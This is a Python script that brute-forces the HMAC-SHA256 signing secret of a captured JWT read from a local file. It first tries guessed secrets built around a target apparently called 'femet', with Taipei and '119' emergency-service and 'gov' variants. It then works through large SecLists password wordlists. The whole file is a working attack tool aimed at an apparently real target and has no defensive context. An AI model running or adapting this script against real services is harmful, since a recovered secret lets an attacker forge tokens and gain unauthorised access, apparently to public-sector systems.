#!/usr/bin/env python3
"""JWT HMAC-SHA256 secret brute-forcer with targeted wordlists"""
import hmac, hashlib, base64, sys, os

token = open("/mnt/c/Users/Administrator/Desktop/JySecAI/erpc/data/femet_jwt.txt").read().strip()
parts = token.split(".")
signing_input = (parts[0] + "." + parts[1]).encode()
expected_sig = base64.urlsafe_b64decode(parts[2] + "==")

# Target wordlists (prioritized)
wordlists = [
    "/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-version-1.txt",
    "/usr/share/wordlists/seclists/Passwords/Language/Short-Plaintexts.txt",
    "/usr/share/wordlists/seclists/Passwords/Xato-Top-10000.txt",
    "/usr/share/wordlists/dirb/smaller/dicc.txt",
]

# Also include targeted secrets
targeted = [
    "femet", "femet2020", "femet2021", "femet2022", "femet2023", "femet2024", "femet2025",
    "femet-123", "femet123!", "Femet2020", "FEMET", "femetadmin", "adminfemet",
    "tpe", "tpe119", "taipei", "taipei119", "tpc", "tfd", "gov", "g0v",
    "tpf", "tpc", "tfd", "femet2020!", "TPE119", "taipei119!",
    "tpeRTC", "femetRTC", "femetRTC2020", "femet2020tpe",
    "tper tc", "tpe_rtc", "femet_rtc", "femet!2020", "femet@2020",
    "femet#2020", "femet$2020", "femet%23", "femet!@#",
    "1234567890", "qwerty", "letmein", "welcome",
    "secret", "changeme", "password1", "Password1",
    "femet123456", "femet!@#", "femet2020!",
    "tpe119RTC", "taipei119!", "femetRTC!",
    "n3v3r", "n0tsecure", "default", "key", "jwt", "jwtsecret",
    "expressjwt", "socketio", "socket.secret", "io",
    "tpe1192020", "tpe-119", "femet-2020",
]

found = False
tried = 0

# Try targeted first
for word in targeted:
    sig = hmac.new(word.encode(), signing_input, hashlib.sha256).digest()
    tried += 1
    if hmac.compare_digest(sig, expected_sig):
        print(f"FOUND! Secret = '{word}' (targeted #{tried})")
        found = True
        break

if not found:
    print(f"Targeted: tried {tried} words, not found")
    
    # Try wordlists
    for wl in wordlists:
        if not os.path.exists(wl):
            continue
        print(f"Trying {wl}...")
        count = 0
        with open(wl, "r", errors="ignore") as f:
            for line in f:
                word = line.strip()
                count += 1
                sig = hmac.new(word.encode(), signing_input, hashlib.sha256).digest()
                tried += 1
                if hmac.compare_digest(sig, expected_sig):
                    print(f"FOUND! Secret = '{word}' (wordlist {wl} #{count}, total {tried})")
                    found = True
                    break
                if count % 500000 == 0:
                    print(f"  {count} words tried from {os.path.basename(wl)}, total={tried}")
            if found:
                break

if not found:
    print(f"NOT FOUND. Total tried: {tried}")
